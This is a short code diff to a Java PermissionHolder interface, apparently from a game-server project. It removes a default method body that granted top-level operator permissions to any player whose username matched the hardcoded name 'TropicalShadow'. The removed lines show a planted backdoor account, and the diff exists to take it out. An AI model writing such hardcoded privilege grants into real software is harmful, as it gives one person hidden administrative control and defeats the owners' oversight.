@@ -68,11 +68,7 @@ public interface PermissionHolder extends NamedAndIdentified, Audience {
      * Override for custom permission user loading logic.
      */
     default void onPermissionUserLoad(){
-        if(this instanceof Player player){
-            if(hasPermission("group.admin").asBoolean() || player.getUsername().equals("TropicalShadow")){
-                player.setPermissionLevel(4);
-            }
-        }
+
     }
 
     /**
